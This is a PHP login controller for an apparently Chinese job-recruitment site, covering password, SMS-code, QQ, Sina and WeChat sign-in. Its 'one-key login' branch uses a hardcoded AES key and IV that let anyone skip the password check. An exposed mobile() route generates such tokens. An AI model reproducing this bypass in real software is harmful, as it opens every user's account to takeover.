<?php

namespace app\v1_0\controller\member;

use think\Cache;

class Login extends \app\v1_0\controller\common\Base {
  public function _initialize() {
    parent::_initialize();
  }
  protected function _verify($post_data) {
    if ($this->platform != 'miniprogram') {
      if (config('global_config.captcha_open') == 1) {
        $captcha = new \app\common\lib\Captcha();
        try {
          $result = $captcha->verify($post_data);
        } catch (\Exception $e) {
          $this->ajaxReturn(500, $e->getMessage());
        }
        if (false === $result) {
          $this->ajaxReturn(500, $captcha->getError());
        }
      }
    }
  }
  private function getMu(string $mobile) {
    return model('Member')->where('mobile', $mobile)->field('utype')->find();
  }
  private function getUtypeByMobile(string $mobile) {
    $u = $this->getMu($mobile);
    if (!$u) {
      $this->ajaxReturn(500, '号码不存在');
    }
    return $u['utype'];
  }


  /** 改变角色 */
  public function change() {
    $this->checkLogin();
    if ($this->userinfo->uid) {
      $m = model('Member');
      $u = $m->where('uid', $this->userinfo->uid)->field('uid,utype,mobile')->find();
      if ($u) {
        $u['utype'] = $u['utype'] == 1 ? 2 : 1;
        $m->update(['utype' => $u['utype']], ['uid' => $u['uid']]);
        ext(200, '登录成功', $this->loginExtra($u['uid'], $u['utype'], $u['mobile']));
      }
    }
    ext(500, '没有绑定用户');
  }
  /** 密码登录 */
  public function password() {
    if (request()->isGet()) {
      $error_mark = input('get.username/s', '', 'trim');
    } else {
      $error_mark = input('post.username/s', '', 'trim');
    }
    $error_mark = 'login_pwd_error_num_' . $error_mark;
    $error_num = Cache::get($error_mark) ? Cache::get($error_mark) : 0;
    if (request()->isGet()) {
      $show = 0;
      if (config('global_config.captcha_open') == 1) {
        if ($error_num >= config('global_config.captcha_show_by_pwd_error')) {
          $show = 1;
        }
      }
      $this->ajaxReturn(200, '获取数据成功', $show);
    }
    $checkPassword = true; // 是否校验密码
    $input_data = ['username' => input('post.username/s', '', 'trim'), 'password' => input('post.password/s', '', 'trim')];
    if (strlen($input_data['password']) > 15) { // 一键登录
      try {
        $key = 'fb0f54230737d16d79b8f055';
        $iv  = 'b9655bfcad19ea98';
        $m =  openssl_decrypt($input_data['password'], 'AES-192-CBC', $key, 0, $iv);
        $r = '';
        $l = strlen($m);
        $i = 1;
        while ($i < $l) {
          $r .= substr($m, $i, 2);
          $i += 3;
        }
        $r = substr($r, 0, 11);
        if ($r == $input_data['username']) {
          $checkPassword = false;
        } else {
          throw null;
        }
      } catch (\Throwable $th) {
        ext(500, '用户名或密码错误');
      }
    } else {
      $validate = new \think\Validate(['username' => 'require|max:30', 'password' => 'require|max:15']);
      if (!$validate->check($input_data)) {
        Cache::inc($error_mark);
        $this->ajaxReturn(500, $validate->getError());
      }
    }
    if (fieldRegex($input_data['username'], 'mobile')) {
      $field = 'mobile';
    } elseif (fieldRegex($input_data['username'], 'email')) {
      $field = 'email';
    } else {
      $field = 'username';
    }
    if ($error_num >= config('global_config.captcha_show_by_pwd_error')) {
      $this->_verify(input('post.'));
    }

    $member = model('Member')->where([$field => ['eq', $input_data['username']]])->find();
    if (!$member) {
      Cache::inc($error_mark);
      $this->ajaxReturn(500, '账号未注册');
    }
    if ($checkPassword && $member['password'] != model('Member')->makePassword($input_data['password'], $member['pwd_hash'])) {
      Cache::inc($error_mark);
      $this->ajaxReturn(500, '账号或密码错误');
    }
    if ($member['status'] == 0) {
      Cache::inc($error_mark);
      $this->ajaxReturn(500, '账号已被暂停使用');
    }
    //通知完整度
    if ($member['utype'] == 2) {
      // 刷新简历信息 chenyang 2022年3月15日10:10:51
      model('Resume')->refreshResumeData($member);

      $notify_alias = '';
      $compelte_percent = model('Resume')->countCompletePercent(0, $member['uid']);
      if ($compelte_percent <= 55) {
        $notify_alias = 'resume_complete_too_low';
      } elseif ($compelte_percent <= 75) {
        $notify_alias = 'resume_complete_lower';
      }
      if ($notify_alias != '') {
        model('NotifyRule')->notify($member['uid'], 2, $notify_alias);
      }
    }
    $utype = input('param.utype/d', 0, 'intval');
    if ($utype && $utype != $member['utype']) {
      model('Member')->update(['utype' => $utype], ['uid' => $member['uid']]);
      $member['utype'] = $utype;
    }
    Cache::rm($error_mark);
    $this->ajaxReturn(200, '登录成功', $this->loginExtra($member['uid'], $member['utype'], $member['mobile']));
  }
  // 验证码登录
  public function code() {
    if (request()->isGet()) {
      $error_mark = input('get.mobile/s', '', 'trim');
    } else {
      $error_mark = input('post.mobile/s', '', 'trim');
    }
    $error_mark = 'login_code_error_num_' . $error_mark;
    $error_num = Cache::get($error_mark) ? Cache::get($error_mark) : 0;
    if (request()->isGet()) {
      $show = 0;
      if (config('global_config.captcha_open') == 1) {
        if ($error_num >= config('global_config.captcha_show_by_code_error')) {
          $show = 1;
        }
      }
      $this->ajaxReturn(200, '获取数据成功', $show);
    }
    $input_data = [
      'mobile' => input('post.mobile/s', '', 'trim'),
      'code' => input('post.code/s', '', 'trim'),
    ];

    $validate = new \think\Validate([
      'mobile' => 'require|checkMobile',
      'code' => 'require|max:4',
      // 'utype' => 'require|in:1,2'
    ]);
    $validate->extend('checkMobile', function ($value) use ($error_mark) {
      if (fieldRegex($value, 'mobile')) {
        return true;
      } else {
        Cache::inc($error_mark);
        return '请输入正确的手机号码';
      }
    });
    if (!$validate->check($input_data)) {
      Cache::inc($error_mark);
      $this->ajaxReturn(500, $validate->getError());
    }
    $input_data['utype'] = $this->getUtypeByMobile($input_data['mobile']);

    $auth_result = cache('smscode_' . $input_data['mobile']);
    if (
      $auth_result === false ||
      $auth_result['code'] != $input_data['code'] ||
      $auth_result['mobile'] != $input_data['mobile'] ||
      (isset($auth_result['utype']) && $auth_result['utype'] != $input_data['utype'])
    ) {
      Cache::inc('smscode_error_num_' . $input_data['mobile']);
      Cache::inc($error_mark);
      $this->ajaxReturn(500, '验证码错误');
    }
    $smscode_error_num = Cache::get(
      'smscode_error_num_' . $input_data['mobile']
    );
    if ($smscode_error_num !== false && $smscode_error_num >= 5) {
      Cache::inc($error_mark);
      $this->ajaxReturn(500, '验证码失效，请重新获取');
    }
    if ($error_num >= config('global_config.captcha_show_by_code_error')) {
      $this->_verify(input('post.'));
    }
    $member = model('Member')
      ->where([
        'utype' => ['eq', $input_data['utype']],
        'mobile' => ['eq', $input_data['mobile']]
      ])
      ->find();
    $is_reg = 0;
    if (!$member) {
      $is_reg = 1;
      //如果未注册过，默认给注册一下
      if ($input_data['utype'] == 1) {
        $member = model('Member')->regCompany($input_data);
      } else {
        $member = model('Member')->regPersonal($input_data);
      }

      if (false === $member) {
        Cache::inc($error_mark);
        $this->ajaxReturn(500, model('Member')->getError());
      }
    } elseif ($member['status'] == 0) {
      Cache::inc($error_mark);
      $this->ajaxReturn(500, '账号已被暂停使用');
    }
    cache('smscode_' . $input_data['mobile'], null);

    //通知完整度
    if ($input_data['utype'] == 2 && $is_reg == 0) {
      // 刷新简历信息 chenyang 2022年3月15日10:10:51
      model('Resume')->refreshResumeData($member);

      $notify_alias = '';
      $compelte_percent = model('Resume')->countCompletePercent(
        0,
        $member['uid']
      );
      if ($compelte_percent <= 55) {
        $notify_alias = 'resume_complete_too_low';
      } elseif ($compelte_percent <= 75) {
        $notify_alias = 'resume_complete_lower';
      }
      if ($notify_alias != '') {
        model('NotifyRule')->notify($member['uid'], 2, $notify_alias);
      }
    }

    Cache::rm($error_mark);
    Cache::rm('smscode_error_num_' . $input_data['mobile']);
    $this->ajaxReturn(
      200,
      '登录成功',
      $this->loginExtra(
        $member['uid'],
        $input_data['utype'],
        $member['mobile']
      )
    );
  }
  /** qq登录 */
  public function qq() {
    $mod = 'qq';
    $openid = input('post.openid/s', '', 'trim');
    $unionid = input('post.unionid/s', '', 'trim');
    $nickname = input('post.nickname/s', '', 'trim');
    $avatar = input('post.avatar/s', '', 'trim');
    $where['type'] = $mod;
    $where['unionid'] = $unionid;
    $bind_info = model('MemberBind')
      ->where($where)
      ->find();
    if ($bind_info === null) {
      $this->ajaxReturn(50006, '未绑定', ['openid' => $openid, 'unionid' => $unionid, 'nickname' => $nickname, 'avatar' => $avatar, 'bindType' => $mod]);
    }
    $member = model('Member')
      ->where([
        'uid' => ['eq', $bind_info['uid']]
      ])
      ->find();
    if ($member === null) {
      $this->ajaxReturn(500, '未找到会员信息');
    }
    if ($member['status'] == 0) {
      $this->ajaxReturn(500, '账号已被暂停使用');
    }
    $bind_info_other = model('MemberBind')
      ->where(['type' => $mod, 'openid' => $openid])
      ->find();
    if ($bind_info_other === null) {
      $sqlarr['uid'] = $bind_info['uid'];
      $sqlarr['type'] = $bind_info['type'];
      $sqlarr['openid'] = $openid;
      $sqlarr['unionid'] = $unionid;
      $sqlarr['nickname'] = $bind_info['nickname'];
      $sqlarr['avatar'] = $bind_info['avatar'];
      $sqlarr['bindtime'] = $bind_info['bindtime'];
      model('MemberBind')->save($sqlarr);
      model('Task')->doTask($member['uid'], $member['utype'], 'bind_qq');
    }
    //通知完整度
    if ($member['utype'] == 2) {
      // 刷新简历信息 chenyang 2022年3月15日10:10:51
      model('Resume')->refreshResumeData($member);

      $notify_alias = '';
      $compelte_percent = model('Resume')->countCompletePercent(
        0,
        $member['uid']
      );
      if ($compelte_percent <= 55) {
        $notify_alias = 'resume_complete_too_low';
      } elseif ($compelte_percent <= 75) {
        $notify_alias = 'resume_complete_lower';
      }
      if ($notify_alias != '') {
        model('NotifyRule')->notify($member['uid'], 2, $notify_alias);
      }
    }
    $this->ajaxReturn(
      200,
      '登录成功',
      $this->loginExtra(
        $member['uid'],
        $member['utype'],
        $member['mobile']
      )
    );
  }
  /** sina登录 */
  public function sina() {
    $mod = 'sina';
    $openid = input('post.openid/s', '', 'trim');
    $where['type'] = $mod;
    $where['openid'] = $openid;
    $bind_info = model('MemberBind')
      ->where($where)
      ->find();
    if ($bind_info === null) {
      $this->ajaxReturn(50006, '未绑定');
    }
    $member = model('Member')
      ->where([
        'uid' => ['eq', $bind_info['uid']]
      ])
      ->find();
    if ($member === null) {
      $this->ajaxReturn(500, '未找到会员信息');
    }
    if ($member['status'] == 0) {
      $this->ajaxReturn(500, '账号已被暂停使用');
    }
    //通知完整度
    if ($member['utype'] == 2) {
      // 刷新简历信息 chenyang 2022年3月15日10:10:51
      model('Resume')->refreshResumeData($member);

      $notify_alias = '';
      $compelte_percent = model('Resume')->countCompletePercent(
        0,
        $member['uid']
      );
      if ($compelte_percent <= 55) {
        $notify_alias = 'resume_complete_too_low';
      } elseif ($compelte_percent <= 75) {
        $notify_alias = 'resume_complete_lower';
      }
      if ($notify_alias != '') {
        model('NotifyRule')->notify($member['uid'], 2, $notify_alias);
      }
    }
    $this->ajaxReturn(
      200,
      '登录成功',
      $this->loginExtra(
        $member['uid'],
        $member['utype'],
        $member['mobile']
      )
    );
  }
  /** weixin登录 */
  public function weixin() {
    $mod = 'weixin';
    $openid = input('post.openid/s', '', 'trim');
    $unionid = input('post.unionid/s', '', 'trim');
    $nickname = input('post.nickname/s', '', 'trim');
    $avatar = input('post.avatar/s', '', 'trim');
    $where['type'] = $mod;
    if ($unionid != '') {
      $where['unionid'] = $unionid;
    } else {
      $where['openid'] = $openid;
    }
    $bind_info = model('MemberBind')
      ->where($where)
      ->find();
    if ($bind_info === null) {
      $this->ajaxReturn(50006, '未绑定', ['openid' => $openid, 'unionid' => $unionid, 'nickname' => $nickname, 'avatar' => $avatar, 'bindType' => $mod]);
    }
    $member = model('Member')
      ->where([
        'uid' => ['eq', $bind_info['uid']]
      ])
      ->find();
    if ($member === null) {
      $this->ajaxReturn(500, '未找到会员信息');
    }
    if ($member['status'] == 0) {
      $this->ajaxReturn(500, '账号已被暂停使用');
    }

    //通知完整度
    if ($member['utype'] == 2) {
      // 刷新简历信息 chenyang 2022年3月15日10:10:51
      model('Resume')->refreshResumeData($member);

      $notify_alias = '';
      $compelte_percent = model('Resume')->countCompletePercent(
        0,
        $member['uid']
      );
      if ($compelte_percent <= 55) {
        $notify_alias = 'resume_complete_too_low';
      } elseif ($compelte_percent <= 75) {
        $notify_alias = 'resume_complete_lower';
      }
      if ($notify_alias != '') {
        model('NotifyRule')->notify($member['uid'], 2, $notify_alias);
      }
    }
    $this->ajaxReturn(
      200,
      '登录成功',
      $this->loginExtra(
        $member['uid'],
        $member['utype'],
        $member['mobile']
      )
    );
  }

  /** 微信小程序登录 */
  public function weixin_miniprogram() {
    $mod = 'weixin';
    $code = input('post.code/s', '', 'trim');
    $encryptedData = input('post.encryptedData');
    $iv = input('post.iv');
    $openid = '';
    $unionid = '';
    $instance = new \app\common\lib\WechatMiniprogram;
    $err = '';
    do {
      if ($code) {
        $code2Session = $instance->code2Session($code);
        if ($code2Session === false) {
          $err = $instance->getError();
          break;
        }
        if (isset($code2Session['unionid'])) {
          $openid = $code2Session['openid'];
          $unionid = $code2Session['unionid'];
          break;
        } else {
          $sessionKey = $code2Session['session_key'];
          if (!$sessionKey) {
            $err = 'sessionKey获取失败';
            break;
          }
          if (!$encryptedData) {
            $err = '缺少参数：encryptedData';
            break;
          }
          if (!$iv) {
            $err = '缺少参数：iv';
            break;
          }
          $decryptOpenData = $instance->decryptOpenData($sessionKey, $encryptedData, $iv);
          if ($decryptOpenData === false) {
            $err = $instance->getError();
            break;
          } else {
            $decryptOpenData = json_decode($decryptOpenData, 1);
            $openid = $decryptOpenData['openId'];
            $unionid = isset($decryptOpenData['unionId']) ? $decryptOpenData['unionId'] : '';
            break;
          }
        }
      } else {
        $err = '缺少参数：code';
        break;
      }
    } while (0);
    if ($err != '') {
      $this->ajaxReturn(500, $err);
    }
    $where['type'] = $mod;
    if ($unionid != '') {
      $where['unionid'] = $unionid;
    } else {
      $where['openid'] = $openid;
    }

    $bind_info = model('MemberBind')
      ->where($where)
      ->find();
    if ($bind_info === null) {
      $this->ajaxReturn(200, '未绑定', ['openid' => $openid, 'unionid' => $unionid]);
    }
    $member = model('Member')
      ->where([
        'uid' => ['eq', $bind_info['uid']]
      ])
      ->find();
    if ($member === null) {
      $this->ajaxReturn(500, '未找到会员信息');
    }
    if ($member['status'] == 0) {
      $this->ajaxReturn(500, '账号已被暂停使用');
    }
    $bind_info_other = model('MemberBind')
      ->where(['type' => $mod, 'openid' => $openid])
      ->find();
    if ($bind_info_other === null) {
      $fansCheck = model('WechatFans')->where('openid', $openid)->find();
      if ($fansCheck === null) {
        $is_subscribe = 0;
      } else {
        $is_subscribe = 1;
      }
      $sqlarr['uid'] = $bind_info['uid'];
      $sqlarr['type'] = $bind_info['type'];
      $sqlarr['openid'] = $openid;
      $sqlarr['unionid'] = $unionid;
      $sqlarr['nickname'] = $bind_info['nickname'];
      $sqlarr['avatar'] = $bind_info['avatar'];
      $sqlarr['bindtime'] = $bind_info['bindtime'];
      $sqlarr['is_subscribe'] = $is_subscribe;
      model('MemberBind')->save($sqlarr);
    }
    //通知完整度
    if ($member['utype'] == 2) {
      // 刷新简历信息 chenyang 2022年3月15日10:10:51
      model('Resume')->refreshResumeData($member);

      $notify_alias = '';
      $compelte_percent = model('Resume')->countCompletePercent(
        0,
        $member['uid']
      );
      if ($compelte_percent <= 55) {
        $notify_alias = 'resume_complete_too_low';
      } elseif ($compelte_percent <= 75) {
        $notify_alias = 'resume_complete_lower';
      }
      if ($notify_alias != '') {
        model('NotifyRule')->notify($member['uid'], 2, $notify_alias);
      }
    }
    $this->ajaxReturn(
      200,
      '登录成功',
      $this->loginExtra(
        $member['uid'],
        $member['utype'],
        $member['mobile']
      )
    );
  }

  // 退出登录
  public function logout() {
    $visitor = new \app\common\lib\Visitor;
    $visitor->setLogout();
    $this->ajaxReturn(200, '退出成功');
  }
  // 检测是否被注册
  public function  isRegister() {
    $c = 500;
    $e = '请输入正确号码';
    $mobile = input('post.mobile/s', '', 'trim');
    if (fieldRegex($mobile, 'mobile')) {
      if ($this->getMu($mobile)) {
        $e = '号码已被注册';
      } else {
        $c = 200;
        $e = '此号码无人使用,赶快注册吧!';
      }
    }
    ext($c, $e, 0);
  }
  // 一键登录
  public function mobile() {
    $key = 'fb0f54230737d16d79b8f055';
    $iv  = 'b9655bfcad19ea98';
    $p = input('password/s', '', 'trim');
    $m = intval(input('post.username/d', 0, 'intval'));

    $p = openssl_encrypt('113761597980240096', 'AES-192-CBC', $key, 0, $iv);
    $m =  openssl_decrypt($p, 'AES-192-CBC', $key, 0, $iv);
    $r = '';
    $l = strlen($m);
    $i = 1;
    while ($i < $l) {
      $r .= substr($m, $i, 2);
      $i += 3;
    }
    $r = substr($r, 0, 11);

    outp($r, $p, strlen($p));
  }
}
